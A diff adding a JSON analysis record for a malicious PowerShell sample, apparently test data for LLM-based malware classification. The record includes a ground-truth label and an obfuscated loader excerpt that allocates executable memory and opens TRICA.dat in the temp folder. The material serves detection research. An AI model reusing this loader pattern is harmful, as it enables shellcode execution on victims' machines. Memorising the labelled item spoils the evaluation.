@@ -1,0 +1,141 @@
+{
+  "meta": {
+    "quelldatei": "0921bdc85effd18e3c467d28105458420febcab5e458f58fcee82914e5ca61c7.ps1",
+    "sha256": "0921bdc85effd18e3c467d28105458420febcab5e458f58fcee82914e5ca61c7",
+    "groesse_bytes": 2742,
+    "zeilen": 98,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "\n\nusing System;\n\nusing System.Runtime.InteropServices;\n\npublic static class Sludrech1\n\n{\n\n[DllImport(",
+      ")]public static extern int NtAllocateVirtualMemory(int Sludrech6,ref Int32 VERSALERN,int Forbistrin,ref Int32 Sludrech,int Refrman,int Sludrech7);\n\n[DllImport(",
+      ")]public static extern IntPtr CreateFileA(string Monstr,uint Melle8,int Nonpercep,int Sludrech0,int HABAN,int BAAN,int NRINGS);\n\n[DllImport(",
+      ")]public static extern int ReadFile(int Forbistrin0,uint Forbistrin1,IntPtr Forbistrin2,ref Int32 Forbistrin3,int Forbistrin4);\n\n[DllImport(",
+      ")]public static extern IntPtr CallWindowProcW(IntPtr Forbistrin5,int Forbistrin6,int Forbistrin7,int Forbistrin8,int Forbistrin9);\n\n}\n\n",
+      "Hild3",
+      "Pierid",
+      "sekreter",
+      "$env:temp",
+      "\\TRICA.dat",
+      "Carcharo",
+      "Overtrampl",
+      "Zeal9",
+      "Kalkvrk4",
+      "levefodend",
+      "Strbe4",
+      "LINENDESK",
+      "Speakeasyc8",
+      "MUSKU",
+      "Brandslu",
+      "Addibledes",
+      "Phob",
+      "Nightw3",
+      "Tjeneste",
+      "Highwayma",
+      "Opdateri"
+    ],
+    "string_anzahl_gesamt": 26,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "\n\nusing System;\n\nusing System.Runtime.InteropServices;\n\npublic static class Sludrech1\n\n{\n\n[DllImport(",
+      ")]public static extern int NtAllocateVirtualMemory(int Sludrech6,ref Int32 VERSALERN,int Forbistrin,ref Int32 Sludrech,int Refrman,int Sludrech7);\n\n[DllImport(",
+      ")]public static extern IntPtr CreateFileA(string Monstr,uint Melle8,int Nonpercep,int Sludrech0,int HABAN,int BAAN,int NRINGS);\n\n[DllImport(",
+      ")]public static extern int ReadFile(int Forbistrin0,uint Forbistrin1,IntPtr Forbistrin2,ref Int32 Forbistrin3,int Forbistrin4);\n\n[DllImport(",
+      ")]public static extern IntPtr CallWindowProcW(IntPtr Forbistrin5,int Forbistrin6,int Forbistrin7,int Forbistrin8,int Forbistrin9);\n\n}\n\n",
+      "Hild3",
+      "Pierid",
+      "sekreter",
+      "$env:temp",
+      "\\TRICA.dat",
+      "Carcharo",
+      "Overtrampl",
+      "Zeal9",
+      "Kalkvrk4",
+      "levefodend",
+      "Strbe4",
+      "LINENDESK",
+      "Speakeasyc8",
+      "MUSKU",
+      "Brandslu",
+      "Addibledes",
+      "Phob",
+      "Nightw3",
+      "Tjeneste",
+      "Highwayma",
+      "Opdateri"
+    ],
+    "string_anzahl_gesamt": 26,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Add-Type",
+      "Test-Path"
+    ],
+    "auffaellige_tokens": {
+      "add_type": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "$env:temp"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "\n\nusing System;\n\nusing System.Runtime.InteropServices;\n\npublic static class Sludrech1\n\n{\n\n[DllImport(",
+      ")]public static extern int NtAllocateVirtualMemory(int Sludrech6,ref Int32 VERSALERN,int Forbistrin,ref Int32 Sludrech,int Refrman,int Sludrech7);\n\n[DllImport(",
+      ")]public static extern IntPtr CreateFileA(string Monstr,uint Melle8,int Nonpercep,int Sludrech0,int HABAN,int BAAN,int NRINGS);\n\n[DllImport(",
+      ")]public static extern int ReadFile(int Forbistrin0,uint Forbistrin1,IntPtr Forbistrin2,ref Int32 Forbistrin3,int Forbistrin4);\n\n[DllImport(",
+      ")]public static extern IntPtr CallWindowProcW(IntPtr Forbistrin5,int Forbistrin6,int Forbistrin7,int Forbistrin8,int Forbistrin9);\n\n}\n\n",
+      "Hild3",
+      "Pierid",
+      "sekreter",
+      "$env:temp",
+      "\\TRICA.dat",
+      "Carcharo",
+      "Overtrampl",
+      "Zeal9",
+      "Kalkvrk4",
+      "levefodend",
+      "Strbe4",
+      "LINENDESK",
+      "Speakeasyc8",
+      "MUSKU",
+      "Brandslu",
+      "Addibledes",
+      "Phob",
+      "Nightw3",
+      "Tjeneste",
+      "Highwayma",
+      "Opdateri"
+    ],
+    "string_anzahl_gesamt": 26,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Add-Type",
+      "Test-Path"
+    ],
+    "auffaellige_tokens": {
+      "add_type": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "$env:temp"
+      ]
+    },
+    "deobfuskiert_auszug": "#brick Lillith Post8 Tactilesi RADICU Parrafoura Servbjer4 Buttwo8 ghent OMSK Songishmi3 CUPPERSDEX Srge9 Ingnu1 Kandelabr3 Saronic MIKEYNOTH NITRERIN TACK PIGPENB Betapart5 genioh Ugeskrif Beslagsm7 Nonpsych9 sensitiz \n\n\n\n\n\nAdd-Type -TypeDefinition @\"\n\nusing System;\n\nusing System.Runtime.InteropServices;\n\npublic static class Sludrech1\n\n{\n\n[DllImport(\"ntdll.dll\")]public static extern int NtAllocateVirtualMemory(int Sludrech6,ref Int32 VERSALERN,int Forbistrin,ref Int32 Sludrech,int Refrman,int Sludrech7);\n\n[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateFileA(string Monstr,uint Melle8,int Nonpercep,int Sludrech0,int HABAN,int BAAN,int NRINGS);\n\n[DllImport(\"kernel32.dll\")]public static extern int ReadFile(int Forbistrin0,uint Forbistrin1,IntPtr Forbistrin2,ref Int32 Forbistrin3,int Forbistrin4);\n\n[DllImport(\"user32.dll\")]public static extern IntPtr CallWindowProcW(IntPtr Forbistrin5,int Forbistrin6,int Forbistrin7,int Forbistrin8,int Forbistrin9);\n\n}\n\n\"@\n\n#cisterci punkter Temu4 PATRONES Hestek UNREFO bekrans Pampr Genbru decer Crescent Thiasusi piltst Omsorgsce Prel6 barskabesn Metathe Televsnets6 Smals7 BOOSTERI mism PINS Tndehvl1 skriv Over unpropag \n\nTest-Path \"Hild3\" \n\nTest-Path \"Pierid\" \n\n$Sludrech3=0;\n\n$Sludrech9=1048576;\n\n$Sludrech8=[Sludrech1]::NtAllocateVirtualMemory(-1,[ref]$Sludrech3,0,[ref]$Sludrech9,12288,64)\n\n#sogne sang NYTVANC Rilletpro8 popular billedm lseproc constan Subte Ilsabet9 hulkynap bevrteren Sidevi Mast Ensom1 Underscale1 Trykkeril Idoliseri1 redu undvigeman Defe KNOCKOU Slvestes Nonbe Rearbitrat corbeilsdo sandsynli \n\nTest-Path \"sekreter\" \n\n$Sludrech2=\"$env:temp\" + \"\\TRICA.dat\"\n\n#efter Duppetfor5 Carfu1 surene AFSIG arikaraper PIGEONHOLE Hovele Smelte melena Utak3 GLORIENS Concio5 \n\n$Sludrech4=[Sludrech1]::CreateFileA($Sludrech2,2147483648,1,0,3,128,0)\n\n#Bumbershoo Unfl3 Unsacra5 Ophthal Brattin2 PYTHO Hermedp8 Lrer2 varp Quadwo Overthro2 Armeniaarr3 Halv4 Crunklepen4 respir SMUKKESTIV \n\nTest-Path \"Carcharo\" \n\n$Sludrech5=0;\n\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": []
+  }
+}
